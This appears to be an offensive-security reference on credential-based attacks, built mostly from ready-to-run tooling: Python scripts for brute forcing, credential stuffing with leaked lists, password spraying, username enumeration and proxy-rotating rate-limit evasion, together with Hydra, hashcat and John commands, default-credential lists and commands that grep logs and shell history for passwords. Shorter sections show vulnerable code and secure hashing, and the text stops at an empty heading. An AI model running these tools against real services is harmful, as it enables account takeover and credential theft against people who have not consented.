# Credential-Based Attacks

## Table of Contents
1. [Brute Force Attacks](#1-brute-force-attacks)
2. [Password Security Issues](#2-password-security-issues)
3. [Username Enumeration](#3-username-enumeration)
4. [Credential Storage Vulnerabilities](#4-credential-storage-vulnerabilities)

---

## 1. Brute Force Attacks

### 1.1 Online Brute Force

Online brute force attacks target live authentication endpoints by systematically trying credentials against a running service.

#### Vulnerable Code Example (PHP)
```php
// VULNERABLE: No rate limiting or account lockout
function authenticate($username, $password) {
    $query = "SELECT * FROM users WHERE username = ? AND password = ?";
    $stmt = $pdo->prepare($query);
    $stmt->execute([$username, hash('sha256', $password)]);

    if ($stmt->rowCount() > 0) {
        return true;
    }
    return false;
}
```

#### Exploitation Techniques

**Hydra - HTTP Form Attack**
```bash
# Basic HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    target.com http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# With cookies and custom headers
hydra -l admin -P passwords.txt target.com http-post-form \
    "/api/login:user=^USER^&pass=^PASS^:H=Cookie: session=abc123:F=failed"

# Multiple usernames from file
hydra -L users.txt -P passwords.txt target.com http-post-form \
    "/login:username=^USER^&password=^PASS^:S=302"
```

**Burp Suite Intruder Configuration**
```
Attack Type: Cluster Bomb (for user:pass combinations)
Payload Set 1: Usernames
Payload Set 2: Passwords
Grep Match: "Invalid", "Error", "incorrect"
Resource Pool: Max concurrent requests = 10
```

**Custom Python Script**
```python
import requests
import threading
from queue import Queue

class BruteForcer:
    def __init__(self, target_url, username):
        self.target_url = target_url
        self.username = username
        self.found = False
        self.session = requests.Session()

    def try_login(self, password):
        if self.found:
            return

        data = {
            'username': self.username,
            'password': password
        }

        try:
            response = self.session.post(
                self.target_url,
                data=data,
                allow_redirects=False,
                timeout=10
            )

            # Check for success indicators
            if response.status_code == 302:
                print(f"[+] Found: {self.username}:{password}")
                self.found = True
            elif "Welcome" in response.text:
                print(f"[+] Found: {self.username}:{password}")
                self.found = True

        except requests.exceptions.RequestException as e:
            pass

    def worker(self, queue):
        while not queue.empty() and not self.found:
            password = queue.get()
            self.try_login(password)
            queue.task_done()

    def run(self, wordlist_path, threads=10):
        queue = Queue()

        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                queue.put(line.strip())

        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=self.worker, args=(queue,))
            t.start()
            thread_list.append(t)

        for t in thread_list:
            t.join()

# Usage
bruter = BruteForcer("https://target.com/login", "admin")
bruter.run("/usr/share/wordlists/rockyou.txt", threads=20)
```

### 1.2 Offline Brute Force

Offline attacks target captured hashes without interacting with the live system.

#### Hash Identification
```bash
# Using hashid
hashid 'hash_value'

# Using hash-identifier
hash-identifier

# Common hash formats
MD5:          32 hex characters
SHA1:         40 hex characters
SHA256:       64 hex characters
bcrypt:       $2a$, $2b$, $2y$ prefix
NTLM:         32 hex characters (uppercase)
```

#### Hashcat Commands
```bash
# MD5
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# SHA1
hashcat -m 100 -a 0 hashes.txt wordlist.txt

# SHA256
hashcat -m 1400 -a 0 hashes.txt wordlist.txt

# bcrypt
hashcat -m 3200 -a 0 hashes.txt wordlist.txt

# MD5 with salt (salt:hash format)
hashcat -m 10 -a 0 hashes.txt wordlist.txt

# SHA256 with salt
hashcat -m 1410 -a 0 hashes.txt wordlist.txt

# NTLM
hashcat -m 1000 -a 0 hashes.txt wordlist.txt

# Rule-based attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (8 char lowercase + digit)
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?d

# Hybrid attack (wordlist + mask)
hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d
```

#### John the Ripper Commands
```bash
# Auto-detect hash format
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify format
john --format=raw-md5 --wordlist=wordlist.txt hashes.txt
john --format=raw-sha256 --wordlist=wordlist.txt hashes.txt
john --format=bcrypt --wordlist=wordlist.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Incremental mode
john --incremental hashes.txt

# With rules
john --wordlist=wordlist.txt --rules=jumbo hashes.txt
```

### 1.3 Distributed Brute Force

Attacks spread across multiple IP addresses to evade detection.

#### Detection Evasion Techniques
```python
import requests
import random
import time
from itertools import cycle

class DistributedBruteForce:
    def __init__(self, target_url):
        self.target_url = target_url
        self.proxies = self.load_proxies()
        self.user_agents = self.load_user_agents()

    def load_proxies(self):
        # Proxy rotation list
        return cycle([
            {"http": "socks5://proxy1:1080", "https": "socks5://proxy1:1080"},
            {"http": "socks5://proxy2:1080", "https": "socks5://proxy2:1080"},
            {"http": "http://proxy3:8080", "https": "http://proxy3:8080"},
        ])

    def load_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
        ]

    def try_credential(self, username, password):
        proxy = next(self.proxies)
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }

        # Random delay to avoid pattern detection
        time.sleep(random.uniform(0.5, 2.0))

        try:
            response = requests.post(
                self.target_url,
                data={"username": username, "password": password},
                headers=headers,
                proxies=proxy,
                timeout=15
            )
            return response
        except:
            return None
```

### 1.4 Credential Stuffing

Using leaked credentials from data breaches to attempt logins on other services.

#### Credential Stuffing Script
```python
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

class CredentialStuffer:
    def __init__(self, target_url, credentials_file):
        self.target_url = target_url
        self.credentials_file = credentials_file
        self.valid_creds = []

    def load_credentials(self):
        """Load credentials from various formats"""
        credentials = []
        with open(self.credentials_file, 'r') as f:
            for line in f:
                line = line.strip()
                # Format: email:password or user:pass
                if ':' in line:
                    parts = line.split(':', 1)
                    credentials.append((parts[0], parts[1]))
                # Format: email,password
                elif ',' in line:
                    parts = line.split(',', 1)
                    credentials.append((parts[0], parts[1]))
        return credentials

    def try_credential(self, email, password):
        """Attempt login with credential pair"""
        session = requests.Session()

        data = {
            'email': email,
            'password': password
        }

        try:
            response = session.post(
                self.target_url,
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )

            if response.status_code == 200 and 'token' in response.text:
                return (email, password, True)
            return (email, password, False)

        except Exception as e:
            return (email, password, None)

    def run(self, max_workers=5):
        credentials = self.load_credentials()

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(self.try_credential, email, password): (email, password)
                for email, password in credentials
            }

            for future in as_completed(futures):
                email, password, result = future.result()
                if result:
                    print(f"[+] Valid: {email}:{password}")
                    self.valid_creds.append((email, password))

        return self.valid_creds

# Usage
stuffer = CredentialStuffer(
    "https://target.com/api/login",
    "leaked_credentials.txt"
)
valid = stuffer.run(max_workers=3)
```

### 1.5 Password Spraying

Testing a single password against many accounts to avoid lockouts.

#### Password Spraying Script
```python
import requests
import time
from datetime import datetime

class PasswordSprayer:
    def __init__(self, target_url, users_file):
        self.target_url = target_url
        self.users = self.load_users(users_file)
        self.common_passwords = [
            'Password1!', 'Welcome1!', 'Summer2024!', 'Winter2024!',
            'Company123!', 'Password123', 'Qwerty123!', 'Admin123!',
            'Changeme1!', 'P@ssw0rd', 'Password1', 'Welcome1',
            '123456', 'password', 'admin', 'letmein'
        ]

    def load_users(self, users_file):
        with open(users_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]

    def spray(self, delay_between_passwords=1800):
        """
        Spray each password against all users.
        Default 30 min delay between password attempts per account.
        """
        for password in self.common_passwords:
            print(f"\n[*] Spraying password: {password}")
            print(f"[*] Time: {datetime.now()}")

            for user in self.users:
                try:
                    response = requests.post(
                        self.target_url,
                        data={'username': user, 'password': password},
                        timeout=10
                    )

                    if self.is_success(response):
                        print(f"[+] SUCCESS: {user}:{password}")

                except Exception as e:
                    print(f"[-] Error for {user}: {e}")

                # Small delay between users
                time.sleep(0.5)

            # Long delay between passwords to avoid lockout
            print(f"[*] Waiting {delay_between_passwords}s before next password...")
            time.sleep(delay_between_passwords)

    def is_success(self, response):
        # Customize based on target application
        if response.status_code == 302:
            return True
        if 'dashboard' in response.url:
            return True
        if 'Invalid' not in response.text and 'error' not in response.text.lower():
            return True
        return False

# Usage
sprayer = PasswordSprayer(
    "https://target.com/login",
    "users.txt"
)
sprayer.spray(delay_between_passwords=1800)  # 30 min delay
```

#### Spray Hydra Command
```bash
# Password spray with Hydra
hydra -L users.txt -p 'Winter2024!' target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Invalid" -t 1 -w 30

# O365 password spray
sprayhound -U users.txt -p 'Summer2024!' -d target.onmicrosoft.com
```

### 1.6 Rate Limiting Bypass

Techniques to circumvent rate limiting protections.

#### Bypass Techniques

**IP Rotation Headers**
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

**Rate Limit Bypass Script**
```python
import requests
import random

class RateLimitBypass:
    def __init__(self, target_url):
        self.target_url = target_url

    def generate_bypass_headers(self):
        """Generate headers to bypass rate limiting"""
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

        return {
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'X-Originating-IP': ip,
            'X-Remote-IP': ip,
            'X-Client-IP': ip,
            'X-Forwarded': ip,
            'Forwarded-For': ip,
            'True-Client-IP': ip,
            'X-Forwarded-Host': f'host{random.randint(1,100)}.target.com',
            'X-Original-URL': f'/login{random.randint(1,100)}',
            'X-Rewrite-URL': f'/login{random.randint(1,100)}',
        }

    def try_login_with_bypass(self, username, password):
        headers = self.generate_bypass_headers()

        response = requests.post(
            self.target_url,
            data={'username': username, 'password': password},
            headers=headers
        )
        return response

# Additional bypass techniques
bypass_techniques = {
    # Case variation in endpoint
    'endpoint_case': ['/Login', '/LOGIN', '/loGin', '/LogIn'],

    # Adding parameters
    'param_variation': [
        '/login?id=1', '/login?rand=123', '/login#anchor',
        '/login;param=1', '/login/./','./login'
    ],

    # HTTP method changes
    'method_variation': ['POST', 'PUT', 'PATCH'],

    # Content-Type changes
    'content_type': [
        'application/x-www-form-urlencoded',
        'application/json',
        'multipart/form-data',
        'text/plain'
    ],

    # Path normalization bypass
    'path_bypass': [
        '/login/', '//login', '/./login', '/login/..',
        '/%6cogin', '/log%69n', '/login%00'
    ]
}
```

**Null Byte and Encoding Bypass**
```python
# Various encoding bypasses for rate limiting
payloads = [
    # Null byte injection
    "admin%00",
    "admin\x00",

    # Unicode normalization
    "admin\u0041",  # A in unicode

    # Double URL encoding
    "admin%2500",

    # Mixed case (for case-insensitive systems)
    "Admin", "ADMIN", "aDmIn",

    # Whitespace padding
    " admin", "admin ", " admin ",
    "admin\t", "\tadmin",

    # Special character injection
    "admin.", ".admin", "admin@",
]
```

---

## 2. Password Security Issues

### 2.1 Weak Password Policies

#### Vulnerable Code Example (Node.js)
```javascript
// VULNERABLE: No password complexity requirements
app.post('/register', async (req, res) => {
    const { username, password } = req.body;

    // Only checks minimum length
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password too short' });
    }

    // No complexity, no common password check
    const user = await User.create({
        username,
        password: await bcrypt.hash(password, 10)
    });

    res.json({ message: 'User created' });
});
```

#### Password Policy Testing Payloads
```
# Minimum length bypass
a
aa
aaa
1234
12345

# Common weak passwords
password
123456
password123
qwerty
letmein
welcome
admin
root

# Dictionary words
summer
winter
football
baseball
dragon
master
monkey

# Keyboard patterns
qwerty123
asdfgh
zxcvbn
1qaz2wsx
qwertyuiop

# Sequential patterns
abc123
123abc
111111
aaaaaa

# Personal info patterns (test with enumerated user data)
{username}123
{company}2024
{firstname}{birthyear}
```

### 2.2 Default and Hardcoded Credentials

#### Vulnerable Code Examples

**Hardcoded Credentials (Python)**
```python
# VULNERABLE: Hardcoded credentials
class DatabaseConnection:
    def __init__(self):
        self.host = "db.internal.company.com"
        self.username = "admin"
        self.password = "SuperSecret123!"  # HARDCODED!
        self.database = "production"

    def connect(self):
        return mysql.connector.connect(
            host=self.host,
            user=self.username,
            password=self.password,
            database=self.database
        )
```

**Default Credentials (Java)**
```java
// VULNERABLE: Default admin credentials
public class AdminSetup {
    private static final String DEFAULT_ADMIN_USER = "admin";
    private static final String DEFAULT_ADMIN_PASS = "admin123";

    public void initializeAdmin() {
        if (!adminExists()) {
            createAdmin(DEFAULT_ADMIN_USER, DEFAULT_ADMIN_PASS);
        }
    }
}
```

#### Common Default Credentials
```
# Web Applications
admin:admin
admin:password
admin:123456
root:root
root:toor
administrator:administrator
user:user
test:test
guest:guest
demo:demo

# Database Systems
MySQL: root:(blank), root:mysql, root:root
PostgreSQL: postgres:postgres
MongoDB: (no auth by default)
Redis: (no auth by default)
Oracle: scott:tiger, system:manager

# Network Devices
Cisco: admin:cisco, cisco:cisco
Juniper: root:juniper123
Netgear: admin:password
D-Link: admin:(blank)

# IoT/Embedded
admin:1234
admin:12345
admin:admin1234
root:calvin (Dell iDRAC)
ADMIN:ADMIN

# Cloud/Services
AWS RDS: admin:admin
Jenkins: admin:admin (older versions)
Tomcat: tomcat:tomcat, admin:admin
JBoss: admin:admin
```

#### Credential Discovery Script
```python
import requests
from concurrent.futures import ThreadPoolExecutor

class DefaultCredChecker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('root', 'root'),
            ('root', 'toor'),
            ('administrator', 'administrator'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest'),
        ]

    def check_credential(self, username, password):
        try:
            response = requests.post(
                self.target_url,
                data={'username': username, 'password': password},
                timeout=10,
                allow_redirects=False
            )

            # Check various success indicators
            if response.status_code in [200, 302]:
                if 'dashboard' in response.headers.get('Location', ''):
                    return True
                if 'welcome' in response.text.lower():
                    return True
                if 'logout' in response.text.lower():
                    return True
            return False
        except:
            return False

    def run(self):
        found = []
        for username, password in self.default_creds:
            if self.check_credential(username, password):
                print(f"[+] Found: {username}:{password}")
                found.append((username, password))
        return found
```

### 2.3 Password in URL and Logs

#### Vulnerable Code Examples

**Password in URL (PHP)**
```php
// VULNERABLE: Password in GET parameter
<form action="/login.php" method="GET">
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Login</button>
</form>

// URL becomes: /login.php?username=admin&password=secret123
// This gets logged in:
// - Server access logs
// - Browser history
// - Proxy logs
// - Referrer headers
```

**Password Logging (Python)**
```python
# VULNERABLE: Logging sensitive data
import logging

logger = logging.getLogger(__name__)

def authenticate(username, password):
    logger.info(f"Login attempt: user={username}, pass={password}")  # BAD!

    # Even worse - logging full request
    logger.debug(f"Request data: {request.form}")  # Logs password

    # Check credentials...
```

#### Log Analysis Commands
```bash
# Search for passwords in logs
grep -ri "password" /var/log/
grep -ri "passwd" /var/log/
grep -ri "pwd=" /var/log/
grep -ri "pass=" /var/log/

# Search Apache/Nginx access logs for GET passwords
grep "password=" /var/log/apache2/access.log
grep "pass=" /var/log/nginx/access.log

# Search application logs
grep -ri "password" /var/log/application/
find /var/log -name "*.log" -exec grep -l "password" {} \;

# Search for credentials in history files
cat ~/.bash_history | grep -i "password\|passwd\|pass="
cat ~/.mysql_history | grep -i "password\|identified by"
```

### 2.4 Autocomplete Issues

#### Vulnerable Code Example
```html
<!-- VULNERABLE: No autocomplete protection -->
<form action="/login" method="POST">
    <input type="text" name="username" id="username">
    <input type="password" name="password" id="password">
    <button type="submit">Login</button>
</form>

<!-- Password fields should have autocomplete="off" or
     autocomplete="new-password" for registration -->
```

#### Autocomplete Testing
```javascript
// Check if autocomplete is properly disabled
document.querySelectorAll('input[type="password"]').forEach(input => {
    const autocomplete = input.getAttribute('autocomplete');
    if (!autocomplete || autocomplete !== 'off' && autocomplete !== 'new-password') {
        console.log('Vulnerable password field:', input.name || input.id);
    }
});

// Browser form autofill can still work even with autocomplete="off"
// More secure approach uses random field names
```

---

## 3. Username Enumeration

### 3.1 Login Error Message Enumeration

#### Vulnerable vs Secure Responses

**Vulnerable Response**
```json
// Different messages reveal valid usernames
{"error": "User not found"}          // Username doesn't exist
{"error": "Invalid password"}         // Username exists!
{"error": "Account locked"}           // Username exists and active!
```

**Secure Response**
```json
// Generic message for all failures
{"error": "Invalid username or password"}
```

#### Enumeration Script
```python
import requests
import time

class UsernameEnumerator:
    def __init__(self, target_url, username_list):
        self.target_url = target_url
        self.usernames = username_list
        self.valid_users = []

    def enumerate(self):
        for username in self.usernames:
            response = requests.post(
                self.target_url,
                data={
                    'username': username,
                    'password': 'invalidpassword123'
                }
            )

            # Check for enumeration indicators
            if self.is_valid_user(response):
                print(f"[+] Valid username: {username}")
                self.valid_users.append(username)

            time.sleep(0.5)  # Rate limiting

        return self.valid_users

    def is_valid_user(self, response):
        indicators_invalid_user = [
            'user not found',
            'no such user',
            'username does not exist',
            'unknown user',
            'invalid user'
        ]

        indicators_valid_user = [
            'incorrect password',
            'wrong password',
            'invalid password',
            'password is incorrect',
            'account locked',
            'account disabled'
        ]

        text = response.text.lower()

        for indicator in indicators_valid_user:
            if indicator in text:
                return True

        return False

# Usage
usernames = ['admin', 'administrator', 'root', 'user', 'test']
enumerator = UsernameEnumerator('https://target.com/login', usernames)
valid = enumerator.enumerate()
```

### 3.2 Registration Enumeration

#### Vulnerable Code Example
```python
# VULNERABLE: Registration reveals existing users
@app.route('/register', methods=['POST'])
def register():
    email = request.form['email']

    if User.query.filter_by(email=email).first():
        return jsonify({'error': 'Email already registered'})  # VULN!

    # Create user...
```

#### Enumeration via Registration
```python
def enumerate_via_registration(target_url, emails):
    valid_emails = []

    for email in emails:
        response = requests.post(
            target_url,
            data={
                'email': email,
                'password': 'TestPass123!',
                'confirm_password': 'TestPass123!'
            }
        )

        if 'already registered' in response.text.lower():
            print(f"[+] Exists: {email}")
            valid_emails.append(email)
        elif 'already exists' in response.text.lower():
            print(f"[+] Exists: {email}")
            valid_emails.append(email)

    return valid_emails
```

### 3.3 Password Reset Enumeration

#### Vulnerable Code Example
```php
// VULNERABLE: Different responses for existing/non-existing users
function passwordReset($email) {
    $user = getUserByEmail($email);

    if (!$user) {
        return "No account found with this email";  // Reveals non-existence
    }

    sendResetEmail($user);
    return "Reset link sent to your email";  // Confirms existence
}
```

#### Reset Enumeration Script
```python
def enumerate_via_reset(target_url, emails):
    valid_emails = []

    for email in emails:
        response = requests.post(
            target_url,
            data={'email': email}
        )

        # Look for differences in responses
        text = response.text.lower()

        # Indicators email exists
        exists_indicators = [
            'reset link sent',
            'check your email',
            'email has been sent',
            'reset instructions sent'
        ]

        # Indicators email doesn't exist
        not_exists_indicators = [
            'no account',
            'not found',
            'does not exist',
            'unknown email',
            'no user'
        ]

        for indicator in exists_indicators:
            if indicator in text:
                print(f"[+] Exists: {email}")
                valid_emails.append(email)
                break

    return valid_emails
```

### 3.4 Timing-Based Enumeration

#### Vulnerable Code Example
```python
# VULNERABLE: Time difference reveals valid users
def authenticate(username, password):
    user = User.query.filter_by(username=username).first()

    if not user:
        return False  # Returns immediately - FAST

    # Password verification takes time - SLOW
    if bcrypt.checkpw(password.encode(), user.password_hash):
        return True

    return False
```

#### Timing Attack Script
```python
import requests
import time
import statistics

class TimingEnumerator:
    def __init__(self, target_url, samples=10):
        self.target_url = target_url
        self.samples = samples

    def measure_response_time(self, username):
        times = []

        for _ in range(self.samples):
            start = time.time()
            requests.post(
                self.target_url,
                data={
                    'username': username,
                    'password': 'x' * 72  # Max bcrypt length
                }
            )
            elapsed = time.time() - start
            times.append(elapsed)

        return {
            'username': username,
            'mean': statistics.mean(times),
            'median': statistics.median(times),
            'stdev': statistics.stdev(times) if len(times) > 1 else 0
        }

    def enumerate(self, usernames):
        # Establish baseline with known-invalid user
        baseline = self.measure_response_time('definitely_not_a_real_user_xyz123')
        print(f"[*] Baseline: {baseline['mean']:.4f}s")

        threshold = baseline['mean'] + (2 * baseline['stdev']) + 0.05

        valid_users = []
        for username in usernames:
            result = self.measure_response_time(username)

            if result['mean'] > threshold:
                print(f"[+] Likely valid: {username} ({result['mean']:.4f}s)")
                valid_users.append(username)
            else:
                print(f"[-] Invalid: {username} ({result['mean']:.4f}s)")

        return valid_users

# Usage
enumerator = TimingEnumerator('https://target.com/login', samples=10)
valid = enumerator.enumerate(['admin', 'test', 'user', 'root'])
```

### 3.5 Response Size Enumeration

#### Response Size Analysis
```python
import requests

def enumerate_by_size(target_url, usernames):
    results = {}

    for username in usernames:
        response = requests.post(
            target_url,
            data={
                'username': username,
                'password': 'wrongpassword'
            }
        )

        size = len(response.content)
        results[username] = {
            'size': size,
            'status': response.status_code
        }
        print(f"{username}: {size} bytes, status {response.status_code}")

    # Group by response size
    size_groups = {}
    for username, data in results.items():
        size = data['size']
        if size not in size_groups:
            size_groups[size] = []
        size_groups[size].append(username)

    print("\n[*] Size Groups:")
    for size, users in sorted(size_groups.items()):
        print(f"  {size} bytes: {users}")

    # Different sizes may indicate valid vs invalid users
    return results
```

### 3.6 API Endpoint Enumeration

#### Common Vulnerable API Patterns
```http
# User existence check endpoints
GET /api/users/check?username=admin
GET /api/users/admin/exists
GET /api/check-username/admin

# User profile endpoints (may return different errors)
GET /api/users/admin
GET /api/profile/admin
GET /api/user/1

# Email verification endpoints
POST /api/verify-email {"email": "admin@target.com"}
GET /api/users/email/admin@target.com
```

#### API Enumeration Script
```python
import requests

class APIEnumerator:
    def __init__(self, base_url):
        self.base_url = base_url

    def enumerate_username_check(self, usernames):
        valid = []
        endpoints = [
            '/api/users/check?username={}',
            '/api/user/exists/{}',
            '/api/check-user/{}',
            '/api/v1/users/{}',
            '/api/users/{}/exists'
        ]

        for endpoint in endpoints:
            for username in usernames:
                url = self.base_url + endpoint.format(username)
                try:
                    response = requests.get(url, timeout=5)

                    # Check for valid user indicators
                    if response.status_code == 200:
                        data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                        if data.get('exists') or data.get('found'):
                            print(f"[+] Valid: {username} via {endpoint}")
                            valid.append(username)
                    elif response.status_code == 404:
                        # 404 might mean user doesn't exist
                        pass
                    elif response.status_code == 401:
                        # 401 might mean user exists but needs auth
                        print(f"[?] Possible: {username} (401)")

                except Exception as e:
                    continue

        return list(set(valid))

    def enumerate_by_error_codes(self, usernames):
        """Check if different users return different HTTP status codes"""
        results = {}

        for username in usernames:
            response = requests.get(
                f"{self.base_url}/api/users/{username}",
                timeout=5
            )

            if response.status_code not in results:
                results[response.status_code] = []
            results[response.status_code].append(username)

        return results
```

---

## 4. Credential Storage Vulnerabilities

### 4.1 Plaintext Password Storage

#### Vulnerable Code Examples

**Plaintext Storage (SQL)**
```sql
-- VULNERABLE: Passwords stored in plaintext
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50),  -- PLAINTEXT!
    email VARCHAR(100)
);

INSERT INTO users (username, password, email)
VALUES ('admin', 'SuperSecret123', 'admin@company.com');
```

**Plaintext Storage (Python)**
```python
# VULNERABLE: Storing password directly
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password  # PLAINTEXT!

    def save(self):
        db.execute(
            "INSERT INTO users (username, password) VALUES (?, ?)",
            (self.username, self.password)
        )
```

#### Detection Techniques
```sql
-- Check for likely plaintext passwords
SELECT username, password FROM users
WHERE LENGTH(password) < 20;

-- Look for readable passwords
SELECT * FROM users
WHERE password REGEXP '^[a-zA-Z0-9!@#$%^&*()]+$'
AND LENGTH(password) < 30;

-- Check if password column allows short values
DESCRIBE users;
```

### 4.2 Weak Hashing Algorithms

#### Vulnerable Hash Usage

**MD5 Hashing (PHP)**
```php
// VULNERABLE: MD5 is cryptographically broken
$password_hash = md5($password);
$password_hash = md5($password . 'static_salt');  // Still weak

// Insert into database
$stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
$stmt->execute([$username, $password_hash]);
```

**SHA1 Hashing (Python)**
```python
import hashlib

# VULNERABLE: SHA1 is weak for passwords
def hash_password(password):
    return hashlib.sha1(password.encode()).hexdigest()

# VULNERABLE: SHA256 without salt is still weak
def hash_password_sha256(password):
    return hashlib.sha256(password.encode()).hexdigest()
```

#### Hash Identification and Cracking
```bash
# Identify hash type
echo "5d41402abc4b2a76b9719d911017c592" | hashid
# Output: [+] MD5

# Common hash lengths
# MD5:    32 characters (128 bits)
# SHA1:   40 characters (160 bits)
# SHA256: 64 characters (256 bits)
# SHA512: 128 characters (512 bits)
# bcrypt: 60 characters, starts with $2a$, $2b$, $2y$

# Crack MD5
hashcat -m 0 -a 0 md5_hashes.txt rockyou.txt

# Crack SHA1
hashcat -m 100 -a 0 sha1_hashes.txt rockyou.txt

# Online rainbow tables
# Check: crackstation.net, hashes.org, cmd5.org
```

### 4.3 Missing Salt

#### Vulnerable Code Example
```python
import hashlib

# VULNERABLE: No salt - allows rainbow table attacks
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# All users with "password123" have the same hash!
# Hash: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
```

#### Salt Analysis
```python
# Check if hashes are salted by looking for duplicates
def check_for_unsalted_hashes(hash_list):
    """
    If multiple users have the same hash,
    the passwords are likely unsalted
    """
    from collections import Counter

    hash_counts = Counter(hash_list)
    duplicates = {h: c for h, c in hash_counts.items() if c > 1}

    if duplicates:
        print("[!] Found duplicate hashes - likely UNSALTED!")
        for hash_val, count in duplicates.items():
            print(f"  {hash_val[:20]}... appears {count} times")
    else:
        print("[*] No duplicates found - may be salted or unique passwords")

    return duplicates

# SQL query to find duplicates
"""
SELECT password_hash, COUNT(*) as count
FROM users
GROUP BY password_hash
HAVING COUNT(*) > 1;
"""
```

### 4.4 Insufficient Iterations

#### Vulnerable bcrypt Configuration
```python
import bcrypt

# VULNERABLE: Cost factor too low (should be at least 10-12)
def hash_password_weak(password):
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=4))

# SECURE: Appropriate cost factor
def hash_password_secure(password):
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

#### PBKDF2 Iteration Analysis
```python
import hashlib
import base64

# VULNERABLE: Too few iterations
def hash_password_weak(password, salt):
    return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 1000)
    # 1000 iterations is too few for modern hardware

# SECURE: Sufficient iterations (OWASP recommends 600,000+ for PBKDF2-SHA256)
def hash_password_secure(password, salt):
    return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)
```

#### Bcrypt Cost Factor Detection
```python
def analyze_bcrypt_hash(hash_value):
    """
    Analyze bcrypt hash to determine cost factor
    Format: $2a$XX$... where XX is the cost factor
    """
    if hash_value.startswith('$2'):
        parts = hash_value.split('$')
        if len(parts) >= 4:
            cost = int(parts[2])
            print(f"[*] Bcrypt cost factor: {cost}")

            if cost < 10:
                print("[!] WARNING: Cost factor too low!")
                print(f"    Cracking time: ~{2**cost * 0.00003:.2f} seconds per password")
            elif cost >= 12:
                print("[+] Cost factor acceptable")
                print(f"    Cracking time: ~{2**cost * 0.00003:.2f} seconds per password")

            return cost
    return None

# Test
analyze_bcrypt_hash("$2a$04$N9qo8uLOickgx2ZMRZoMy.MSwVlhz7PBcKNvPUxjGQiYQGdM0")
```

### 4.5 Secure Password Storage Reference

```python
# SECURE: Proper password hashing with bcrypt
import bcrypt

class SecurePasswordHandler:
    def __init__(self, cost_factor=12):
        self.cost_factor = cost_factor

    def hash_password(self, password):
        """Hash password with appropriate cost factor"""
        salt = bcrypt.gensalt(rounds=self.cost_factor)
        return bcrypt.hashpw(password.encode('utf-8'), salt)

    def verify_password(self, password, hash_value):
        """Verify password against stored hash"""
        return bcrypt.checkpw(password.encode('utf-8'), hash_value)

# SECURE: Using argon2 (winner of Password Hashing Competition)
from argon2 import PasswordHasher

class Argon2Handler:
    def __init__(self):
        self.ph = PasswordHasher(
            time_cost=3,        # iterations
            memory_cost=65536,  # 64MB
            parallelism=4       # threads
        )

    def hash_password(self, password):
        return self.ph.hash(password)

    def verify_password(self, password, hash_value):
        try:
            return self.ph.verify(hash_value, password)
        except:
            return False
```

---

## 5. Testing Tools and Commands Summary

### Brute Force Tools
```bash
# Hydra
hydra -l admin -P wordlist.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Medusa
medusa -h target -u admin -P wordlist.txt -M http -m DIR:/admin

# Ncrack
ncrack -U users.txt -P passwords.txt target:http

# Patator
patator http_fuzz url=http://target/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Invalid'
```

### Hash Cracking
```bash
# Hashcat
hashcat -m 0 hashes.txt wordlist.txt      # MD5
hashcat -m 100 hashes.txt wordlist.txt    # SHA1
hashcat -m 1400 hashes.txt wordlist.txt   # SHA256
hashcat -m 3200 hashes.txt wordlist.txt   # bcrypt

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
john --format=raw-md5 hashes.txt
john --show hashes.txt
```

### Enumeration
```bash
# ffuf for username enumeration
